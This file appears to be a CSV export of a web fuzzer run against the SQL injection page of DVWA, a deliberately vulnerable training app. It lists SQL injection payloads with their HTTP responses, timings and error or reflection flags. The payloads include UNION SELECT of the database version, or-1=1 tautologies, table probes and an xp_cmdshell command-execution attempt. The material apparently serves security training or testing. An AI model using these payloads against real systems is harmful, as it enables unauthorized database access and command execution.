col0,col1,col2,col3,col4,col5,col6,col7,col8,col9,col10,col11,col12,col13,col14
18,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F&Submit=Submit,200,OK,7,482,0,327,4485,,,[%3F]
8,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+NULL%2C+NULL%2C+NULL%2C+NULL%2C++NULL%2C+%28select+%40%40version%29%29+--&Submit=Submit,200,OK,78,572,0,337,162,,error,[%27+union+%28select+NULL%2C+NULL%2C+NULL%2C+NULL%2C++NULL%2C+%28select+%40%40version%29%29+--]
21,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+userid+is+NULL%3B+--&Submit=Submit,200,OK,14,508,0,337,162,,error,[x%27+and+userid+is+NULL%3B+--]
26,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+or+full_name+like+%27%25bob%25&Submit=Submit,200,OK,22,514,0,313,55,,,[x%27+or+full_name+like+%27%25bob%25]
19,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+and+1%3D0%29+union+all&Submit=Submit,200,OK,33,505,0,337,171,,error,[%27+and+1%3D0%29+union+all]
25,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+members.email+is+NULL%3B+--&Submit=Submit,200,OK,6,515,0,337,162,,error,[x%27+and+members.email+is+NULL%3B+--]
9,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a&Submit=Submit,200,OK,91,480,0,327,4485,,Reflected,[a]
20,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F+or+1%3D1+--&Submit=Submit,200,OK,25,494,0,327,4485,,,[%3F+or+1%3D1+--]
15,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+--&Submit=Submit,200,OK,62,486,0,337,160,,error,[a%27+--]
11,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1%27+or+%271%27%3D%271&Submit=Submit,200,OK,76,501,0,327,4832,,,[1%27+or+%271%27%3D%271]
17,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,49,482,0,327,4485,,,[%40]
22,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+email+is+NULL%3B+--&Submit=Submit,200,OK,18,507,0,338,162,,error,[x%27+and+email+is+NULL%3B+--]
23,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=anything%27+or+%27x%27%3D%27x&Submit=Submit,200,OK,20,508,0,327,4867,,,[anything%27+or+%27x%27%3D%27x]
16,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+or+1%3D1%3B+--&Submit=Submit,200,OK,75,498,0,337,162,,error,[a%27+or+1%3D1%3B+--]
24,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--&Submit=Submit,200,OK,40,536,0,337,162,,error,[x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--]
28,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--&Submit=Submit,200,OK,19,536,0,337,206,,error,[%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--]
27,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=23+or+1%3D1%3B+--&Submit=Submit,200,OK,30,496,0,327,4485,,,[23+or+1%3D1%3B+--]
